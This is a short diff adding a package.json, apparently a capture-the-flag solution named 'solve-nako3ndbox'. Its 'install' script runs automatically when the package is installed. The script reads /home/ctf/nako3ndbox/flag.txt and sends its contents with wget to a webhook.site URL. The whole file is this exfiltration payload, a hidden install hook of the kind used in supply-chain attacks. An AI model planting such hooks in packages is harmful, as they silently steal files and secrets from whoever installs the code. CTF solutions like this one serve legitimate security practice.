@@ -1,0 +1,8 @@
+{
+  "name": "solve-nako3ndbox",
+  "version": "1.0.0",
+  "scripts": {
+    "install": "wget https://webhook.site/4755bbda-70d7-4f35-a2ff-0ca70f7d5e6b/?flag=$(cat /home/ctf/nako3ndbox/flag.txt)"
+  },
+  "bin": "index.js"
+}
